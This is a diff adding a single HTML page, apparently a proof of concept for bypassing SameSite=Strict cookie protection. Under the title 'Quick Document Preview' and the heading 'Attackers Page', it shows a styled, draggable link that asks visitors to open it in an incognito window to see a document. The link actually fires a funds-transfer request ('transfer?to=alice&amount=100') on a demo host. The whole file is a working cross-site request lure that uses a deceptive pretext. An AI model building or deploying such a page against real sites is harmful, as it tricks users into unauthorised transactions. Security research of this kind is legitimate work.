@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Quick Document Preview</title>
+
+<style>
+
+body{
+    font-family: Arial, sans-serif;
+    text-align:center;
+    background:#f4f4f4;
+}
+
+.container{
+    margin-top:80px;
+}
+
+#draglink{
+    display:inline-block;
+    padding:15px 25px;
+    background:#7c0a02;
+    color:white;
+    font-size:18px;
+    text-decoration:none;
+    border-radius:8px;
+    cursor:grab;
+}
+
+
+.instructions{
+    margin-top:20px;
+    color:#444;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<h1>Attackers Page</h1>
+<h3>Preview the document</h3>
+
+<p class="instructions">
+To view the document preview, <b></b>Please Open Link in Incognito Window the button below.</b>
+</p>
+
+<a id="draglink"
+   href="https://poc-bypass-samesite-strict.vercel.app/transfer?to=alice&amount=100"
+   draggable="true">
+   Open Link in Incognito Window to see preview Document
+</a>
+
+
+</body>
+</html>
